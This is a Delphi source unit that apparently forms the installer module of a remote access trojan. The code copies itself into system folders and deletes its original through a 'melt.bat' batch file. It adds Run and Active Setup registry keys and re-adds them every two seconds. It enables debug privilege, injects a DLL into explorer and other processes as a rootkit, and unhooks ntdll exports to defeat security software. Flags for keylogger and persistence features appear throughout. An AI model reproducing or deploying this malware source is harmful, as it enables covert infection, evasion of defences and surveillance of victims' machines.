unit uInstallation;

interface
uses Windows, uRegistry, sysutils, winsock, TLHelp32, magicapihooks, shellapi, uFunction, SHFolder,afxCodehook;
const
  RC_PERS = 'PER';
type
  TInstaller = class
  private
    function LocalAppDataPath : string;
    function FindWindowsDir: string;
    function FindTempDir: string;
    function FindSystemDir: string;
    function DebugPrivilege(ToEnable:Boolean):Boolean;
    function GetProcessHandle(sProcessname:string):integer;
    function GetInjectableProcess:integer;
    function GetPointerToRes(res: string):pointer;
  public
    sInstallme,sStartupme,sHCKUStart,sActiveX,sKeylogger,sMelt,sUnHook,sRootkit,sPersistance:Boolean;
    sDllName,installFilename, HKCUStartup,ActiveXStartup,installdir,mutx:string;
    sPersistanceThread:cardinal;
    Procedure Uninstall(sSocket:integer);
    Procedure Install;
    procedure RemoveUserHooks;
    procedure RemoteExecute;
    function CheckExports(ImageBase: pointer; ImageExportDirectory: PImageExportDirectory): boolean;
    function UnhookExport(hModule: HMODULE; FunctionName: pchar): boolean;
    function GetCurrentDir: string;
    function GetData: string;
  end;
var
  Installer: TInstaller;
  tDllname:string;
  tHKCUStartup:string;
  tActiveXStartup:string;
  zHCKUStart:boolean;
  zActiveX:boolean;
implementation
function RegistryPersistance(P:pointer):integer;STDCALL;
var
  Registryman:TRegistryman;
Begin
  Registryman := TRegistryman.Create;
  if (zActiveX = false) and (zHCKUStart = false) then exit;
  repeat
  if zActiveX = true then begin
      Registryman.AniadirClave('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\','', 'clave');
      Registryman.AniadirClave('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\' + tActiveXStartup, '', 'clave');
      Registryman.aniadirclave('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\' + tActiveXStartup + '\StubPath',paramstr(0), 'REG_SZ');
  end;
  if zHCKUStart then begin
      Registryman.AniadirClave('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\' + tHKCUStartup,paramstr(0),'REG_SZ');
  end;
  sleep(2000);
  until 3 = 1;
end;
function TInstaller.GetProcessHandle(sProcessname:string):integer;
Var
  pHandle      :THandle;
  hSnapShot     :THandle;
  ProcessEntry  :TProcessEntry32;
Begin
  hSnapShot := CreateToolHelp32SnapShot(TH32CS_SNAPALL,0);
    ProcessEntry.dwSize := SizeOf(TProcessEntry32);
      try
       Process32First(hSnapShot, ProcessEntry);
        repeat
        if lowercase(ProcessEntry.szExeFile) = lowercase(sProcessname) then begin
          result := OpenProcess(PROCESS_ALL_ACCESS, False, ProcessEntry.th32ProcessID);
          exit;
        end;
        until not Process32Next(hSnapShot, ProcessEntry);
      finally
        CloseHandle(hSnapShot);
      end;
  result := 0;
End;

function TInstaller.GetInjectableProcess:integer;
var
iHandle:integer;
begin
iHandle := GetProcessHandle('spoolsv.exe');
if iHandle <> 0 then begin
  result := iHandle;
  exit;
end;

iHandle := GetProcessHandle('lsass.exe');
if iHandle <> 0 then begin
  result := iHandle;
  exit;
end;

iHandle := GetProcessHandle('explorer.exe');
if iHandle <> 0 then begin
  result := iHandle;
  exit;
end;

result := 0;
end;
function TInstaller.DebugPrivilege(ToEnable:Boolean):Boolean;
var
 OldTokenPrivileges, TokenPrivileges: TTokenPrivileges;
 ReturnLength: DWORD;
 hToken: THandle;
 Luid: Int64;
begin
 Result:=True;
 Result:=False;
 if not OpenProcessToken(GetCurrentProcess,TOKEN_ADJUST_PRIVILEGES,hToken) then Exit;
 try
  if not LookupPrivilegeValue(nil,'SeDebugPrivilege',Luid) then Exit;
  TokenPrivileges.Privileges[0].luid:=Luid;
  TokenPrivileges.PrivilegeCount:=1;
  TokenPrivileges.Privileges[0].Attributes:=0;
  AdjustTokenPrivileges(hToken,False,TokenPrivileges,SizeOf(TTokenPrivileges),OldTokenPrivileges,ReturnLength);
  OldTokenPrivileges.Privileges[0].luid:=Luid;
  OldTokenPrivileges.PrivilegeCount:=1;
  if ToEnable then OldTokenPrivileges.Privileges[0].Attributes:=TokenPrivileges.Privileges[0].Attributes or SE_PRIVILEGE_ENABLED
  else OldTokenPrivileges.Privileges[0].Attributes:=TokenPrivileges.Privileges[0].Attributes and (not SE_PRIVILEGE_ENABLED);
  Result:=AdjustTokenPrivileges(hToken,False,OldTokenPrivileges,ReturnLength,PTokenPrivileges(nil)^,ReturnLength);
 finally
  CloseHandle(hToken);
 end;
end;

procedure TInstaller.RemoteExecute;
var
  Process: dword;
  pid:cardinal;
  Path: array [0..MAX_PATH] of char;
  registryman:TRegistryman;
Begin
  Registryman := TRegistryman.Create;
  DebugPrivilege(true);
  GetWindowThreadProcessID(FindWindow('Shell_TrayWnd', nil), @PID);
  Process := OpenProcess(PROCESS_ALL_ACCESS, False, PID);
  GetCurrentDirectory(MAX_PATH, Path);
  Registryman.AniadirClave('HKEY_CURRENT_USER\Software\Microsoft\MUTSS',mutx,'REG_SZ');
  Registryman.AniadirClave('HKEY_CURRENT_USER\Software\Microsoft\PATHSS',paramstr(0),'REG_SZ');
  injectlibrary(openprocess(PROCESS_ALL_ACCESS,false,pid),GetPointerToRes('PER'));
  registryman.Free;
end;
function TInstaller.GetData: string;
var
  tmpString:string;
begin
  result := installdir + '|' + installFilename + '|';
  if sActiveX = false then tmpString := '-' else tmpstring := ActiveXStartup;
  result := result + tmpstring + '|';
  if sHCKUStart = false then tmpString := '-' else tmpstring := HKCUStartup;
  result := result + tmpstring + '|';
  if sRootkit = true then tmpString := 'Active' else tmpstring := 'Not Active';
  result := result + tmpstring + '|';
  if sUnHook = true then tmpString := 'Active' else tmpstring := 'Not Active';
  result := result + tmpstring + '|';
  if sKeylogger = true then tmpString := 'Active' else tmpstring := 'Not Active';
  result := result + tmpstring + '|';
  if sPersistance = true then tmpString := 'Active' else tmpstring := 'Not Active';
  result := result + tmpstring + '|';
end;

procedure InjectionThread;
begin
repeat
  InjectAllProc(GetPath(ParamStr(0))+tDllName);
until 1 = 2;
end;

function TInstaller.GetCurrentDir: string;
begin
  GetDir(0, Result);
end;

function TInstaller.FindSystemDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetSystemDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function TInstaller.FindTempDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, MAX_PATH);
  DataSize := GetTempPath(MAX_PATH, PChar(Result));
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function TInstaller.FindWindowsDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function TInstaller.LocalAppDataPath : string;
const
   SHGFP_TYPE_CURRENT = 0;
var
   path: array [0..MAX_PATH] of char;
begin
   SHGetFolderPath(0,CSIDL_LOCAL_APPDATA,0,SHGFP_TYPE_CURRENT,@path[0]) ;
    Result := path;
    if Result[Length(Result)] <> '\' then
    Result := Result + '\';
end;
function TInstaller.UnhookExport(hModule: HMODULE; FunctionName: pchar): boolean;
type
  TSections = array [0..0] of TImageSectionHeader;
var
  ModuleName: pchar;
  ImageBase, LoadedImage, pImageBase, pSectionBase: pointer;
  Module: THandle;
  ModuleSize, BytesRead: dword;
  ImageDosHeader: PImageDosHeader;
  ImageNtHeaders: PImageNtHeaders;
  ImageExportDirectory: PImageExportDirectory;
  ExportLoop: integer;
  ExportName: pchar;
  ExportFunction: pointer;
  PNames: pdword;
  PFunctions: pdword;
  PSections: ^TSections;
  SectionLoop: integer;
  SectionBase: pointer;
  VirtualSectionSize, RawSectionSize: dword;
  LoadedAddress: pbyte;
  ExportedAddress: pbyte;
  OldProtection: dword;
  CodeLen: dword;
begin
  Result := False;
  GetMem(ModuleName, MAX_PATH + 1);
  GetModuleFileName(hModule, ModuleName, MAX_PATH + 1);
  ExportedAddress := nil;
  LoadedAddress := nil;
  Module := CreateFile(ModuleName, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  SetFilePointer(Module, 0, nil, FILE_BEGIN);
  ModuleSize := GetFileSize(Module, nil);
  GetMem(LoadedImage, ModuleSize);
  ReadFile(Module, LoadedImage^, ModuleSize, BytesRead, nil);
  CloseHandle(Module);
  ImageDosHeader := PImageDosHeader(LoadedImage);
  ImageNtHeaders := PImageNtHeaders(cardinal(ImageDosHeader._lfanew) + cardinal(LoadedImage));
  ImageBase := VirtualAlloc(nil, ImageNtHeaders.OptionalHeader.SizeOfImage, MEM_RESERVE, PAGE_NOACCESS);
  pImageBase := ImageBase;
  SectionBase := VirtualAlloc(ImageBase, ImageNtHeaders.OptionalHeader.SizeOfHeaders, MEM_COMMIT, PAGE_READWRITE);
  pSectionBase := SectionBase;
  Move(LoadedImage^, SectionBase^, ImageNtHeaders.OptionalHeader.SizeOfHeaders);
  PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) + ImageNtHeaders.FileHeader.SizeOfOptionalHeader);
  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do
  begin
    VirtualSectionSize := PSections[SectionLoop].Misc.VirtualSize;
    RawSectionSize := PSections[SectionLoop].SizeOfRawData;
    if VirtualSectionSize < RawSectionSize then VirtualSectionSize := RawSectionSize;
    SectionBase := VirtualAlloc(PSections[SectionLoop].VirtualAddress + pchar(ImageBase), VirtualSectionSize, MEM_COMMIT, PAGE_READWRITE);
    FillChar(SectionBase^, VirtualSectionSize, 0);
    Move(pointer(cardinal(LoadedImage) + PSections[SectionLoop].PointerToRawData)^, SectionBase^, RawSectionSize);
    VirtualFree(SectionBase, 0, MEM_RELEASE);
  end;
  ImageExportDirectory := PImageExportDirectory(ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + cardinal(ImageBase));
  PNames := pointer(cardinal(ImageExportDirectory.AddressOfNames) + cardinal(ImageBase));
  PFunctions := pointer(cardinal(ImageExportDirectory.AddressOfFunctions) + cardinal(ImageBase));
  for ExportLoop := 0 to ImageExportDirectory.NumberOfNames - 1 do
  begin
    ExportName := pchar(pdword(PNames)^ + cardinal(ImageBase));
    ExportFunction := pointer(pdword(PFunctions)^ + cardinal(ImageBase));
    if lstrcmpi(ExportName, FunctionName) = 0 then
    begin
      LoadedAddress := ExportFunction;
      Break;
    end;
    Inc(PNames);
    Inc(PFunctions);
  end;
  ImageBase := pointer(GetModuleHandle(ModuleName));
  ImageDosHeader := PImageDosHeader(ImageBase);
  ImageNtHeaders := PImageNtHeaders(cardinal(ImageDosHeader._lfanew) + cardinal(ImageBase));
  ImageExportDirectory := PImageExportDirectory(ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + cardinal(ImageBase));
  PNames := pointer(cardinal(ImageExportDirectory.AddressOfNames) + cardinal(ImageBase));
  PFunctions := pointer(cardinal(ImageExportDirectory.AddressOfFunctions) + cardinal(ImageBase));
  for ExportLoop := 0 to ImageExportDirectory.NumberOfNames - 1 do
  begin
    ExportName := pchar(pdword(PNames)^ + cardinal(ImageBase));
    ExportFunction := pointer(pdword(PFunctions)^ + cardinal(ImageBase));
    if lstrcmpi(ExportName, FunctionName) = 0 then
    begin
      ExportedAddress := ExportFunction;
      Break;
    end;
    Inc(PNames);
    Inc(PFunctions);
  end;
  if ((LoadedAddress <> nil) and (ExportedAddress <> nil)) then
  begin
    if ((ExportedAddress^ <> 0) and (LoadedAddress^ <> 0) and (ExportedAddress^ <> LoadedAddress^)) then
    begin
      Result := True;
      //CodeLen := SizeOfProc(LoadedAddress);
      VirtualProtect(ExportedAddress, CodeLen, PAGE_EXECUTE_READWRITE, @OldProtection);
      CopyMemory(ExportedAddress, LoadedAddress, CodeLen);
      VirtualProtect(ExportedAddress, CodeLen, OldProtection, @OldProtection);
    end;
  end;
  FreeMem(ModuleName);
  FreeMem(LoadedImage);
  VirtualFree(pImageBase, 0, MEM_RELEASE);
  VirtualFree(pSectionBase, 0, MEM_RELEASE);
end;

function TInstaller.CheckExports(ImageBase: pointer; ImageExportDirectory: PImageExportDirectory): boolean;
var
  ExportLoop: integer;
  ExportName: pchar;
  PNames: pdword;
  HooksFound: boolean;
begin
  Result := False;
  PNames := pointer(cardinal(ImageExportDirectory.AddressOfNames) + cardinal(ImageBase));
  for ExportLoop := 0 to ImageExportDirectory.NumberOfNames - 1 do
  begin
    ExportName := pchar(pdword(PNames)^ + cardinal(ImageBase));
    HooksFound := UnhookExport(HMODULE(ImageBase), ExportName);
    if HooksFound = True then Result := True;
    Inc(PNames);
  end;
end;

procedure TInstaller.RemoveUserHooks;
var
  ImageBase: pointer;
  ImageDosHeader: PImageDosHeader;
  ImageNtHeaders: PImageNtHeaders;
  ImageExportDirectory: PImageExportDirectory;
begin
  ImageBase := pointer(GetModuleHandle('ntdll'));
  ImageDosHeader := PImageDosHeader(ImageBase);
  ImageNtHeaders := PImageNtHeaders(cardinal(ImageDosHeader._lfanew) + cardinal(ImageBase));
  ImageExportDirectory := PImageExportDirectory(ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + cardinal(ImageBase));
  if ImageExportDirectory <> ImageBase then
  begin
    if ImageExportDirectory.NumberOfNames <> 0 then
    begin
      CheckExports(ImageBase, ImageExportDirectory) ;
    end;
  end;
end;

Procedure TInstaller.Uninstall(sSocket:integer);
var
  f:textfile;
  Registryman:TRegistryman;
Begin
  Registryman := TRegistryman.Create;
  closesocket(sSocket);
  if sRootkit = true then begin
    UnInjectAllProc(GetPath(ParamStr(0))+sDllName);
  end;
  if spersistance then suspendthread(spersistancethread);
  if sHCKUStart = true then Registryman.borraclave('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\' + HKCUStartup);
  if sActiveX = true then Registryman.borraclave('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\' + ActiveXStartup + '\');
  if sInstallme = true then begin
  AssignFile(F, pChar(installdir + 'melt.bat'));
  ReWrite(F);
  WriteLn(F, 'del "'+ParamStr(0)+'"');
  WriteLn(F, 'del "'+GetPath(ParamStr(0))+sDllName+'"');
  WriteLn(F, 'del "' + installdir + 'melt.bat"');
  CloseFile(F);
  ShellExecute(0, 'Open', pchar('melt.bat'),'', PChar(installdir), 0);
  end;
  if sPersistance then begin
  createmutex(0,false,pchar(mutx + '_KILL'));
  end;
  sleep(5000);
  ExitProcess(0);
  Registryman.Free;
End;

function TInstaller.GetPointerToRes(res: string):pointer;
var
  hResInfo: HRSRC;
  hRes:     HGLOBAL;
  tChar:pchar;
begin
  hResInfo := FindResource(hInstance, RC_PERS, RT_RCDATA);
  if hResInfo <> 0 then
  begin
    hRes := LoadResource(hInstance, hResInfo);
    if hRes <> 0 then
    begin
      result := LockResource(hRes);
    end;
  end;
end;

Procedure TInstaller.Install;
var
  F     :TextFile;
  sPoint:pointer;
  sSizes:integer;
  sThread:Cardinal;
  sFunction:TFunctions;
  Registryman:TRegistryman;
  tTempID:cardinal;
Begin
  Registryman := TRegistryman.Create;
  sFunction := TFunctions.Create;
  if sInstallme = true then begin
    if installdir = 'Application Data' then installdir := LocalAppDataPath;
    if installdir = 'Windows' then installdir := FindWindowsDir;
    if installdir = 'System32' then installdir := FindSystemDir;
    if installdir = 'Temp' then installdir := FindTempDir;
    if (sFunction.getos = 'Windows Vista') or (sFunction.getos = 'Windows 7') then installdir := LocalAppDataPath;
    if UpCaseStr(GetCurrentDir + '\') <> UpCaseStr(installdir) then begin
      CopyFile(pChar(ParamStr(0)), pChar(installdir + installFilename), False);
      Sleep(100);
      ShellExecute(0, 'Open', pchar(installFilename),'', PChar(installdir), 0);
      if sMelt then begin
        AssignFile(F, pChar(installdir + 'melt.bat'));
        ReWrite(F);
        WriteLn(F, 'del "'+ParamStr(0)+'"');
        WriteLn(F, 'del "' + installdir + 'melt.bat"');
        CloseFile(F);
        ShellExecute(0, 'Open', pchar('melt.bat'),'', PChar(installdir), 0);
      End;
      ExitProcess(0);
    end;
  end;
  if sUnhook = true then RemoveUserHooks;
  if sStartupme = True then begin
        if sActiveX = true then begin
          Registryman.AniadirClave('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\','', 'clave');//,(HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run', HKCUStartup, ParamStr(0));
          Registryman.AniadirClave('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\' + ActiveXStartup, '', 'clave');
          Registryman.aniadirclave('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\' + ActiveXStartup + '\StubPath',paramstr(0), 'REG_SZ');
        end;
        if sHCKUStart = true then begin
          Registryman.AniadirClave('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\' + HKCUStartup,paramstr(0),'REG_SZ');
        end;
      end;
  if sFunction.iswow64 then begin
      sRootkit := false;
      sPersistance := false;
  end;
  if sRootkit = true then begin
      createthread(nil,0,@injectionthread,nil,0,sThread);
  end;
  if sPersistance = true then begin
    sleep(1000);
    RemoteExecute;
    zActiveX := sactivex;
    zHCKUStart := sHCKUStart;
    tActiveXStartup := ActiveXstartup;
    tHKCUStartup := HKCUstartup;
    sPersistanceThread := CreateThread(nil,0,@RegistryPersistance,nil,0, tTempID);
  end;
  sFunction.Free;
  Registryman.Free;
End;
end.
